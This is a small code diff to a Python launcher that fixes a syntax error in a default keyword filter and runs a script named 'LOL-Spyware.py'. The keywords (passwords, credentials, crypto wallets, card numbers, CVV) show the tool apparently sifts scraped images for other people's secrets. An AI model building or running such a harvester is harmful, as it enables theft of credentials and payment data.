@@ -37,7 +37,7 @@ print("Seperate with space")
 print("The Keywords you want filter the scraped image with")
 print("Quick Summary -> Your Keywords")
 kw = input("Keywords: ")
-keywords = "password login credentials blockchain adress ETH wallet bank CC CVV Experation @ BTC" if kw == None else kewords = kw
+keywords = "password login credentials blockchain adress ETH wallet bank CC CVV Experation @ BTC" if kw == None else kw
 
 subprocess.run(["python", "scripts/LOL-Spyware.py", str(gen), str(ex_num), str(length), str(wait_all)]) # Run the main python script with the input variables
 subprocess.run(["python", "scripts/Remove-Sample-Images.py", "image_sample.png", "image_sample_2.png", "data", "images"]) # Run the 'Remove-Sample-Images.py' python script
